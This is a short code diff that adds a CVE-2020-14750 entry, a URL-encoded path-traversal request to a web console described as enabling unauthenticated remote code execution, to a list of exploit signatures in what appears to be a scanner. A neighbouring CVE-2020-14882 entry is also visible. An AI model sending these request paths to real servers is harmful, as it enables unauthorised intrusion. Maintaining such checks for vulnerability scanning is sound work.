@@ -131,6 +131,15 @@ exploit_dict = [
         "headers": {},
         "description": "Unauthenticated remote code execution via path traversal."
     },
+        {
+        "exploit": "CVE-2020-14750",
+        "exploit_path": "/console/images/%2e%2e%2fconsole.portal",
+        "method": "['GET']",
+        "response": "Unauthorized access",
+        "response_status": 403,
+        "headers": {},
+        "description": "Unauthenticated remote code execution via path traversal."
+    },
     {
         "exploit": "CVE-2020-14882",
         "exploit_path": "/console/css/%252e%252e%252fconsole.portal",
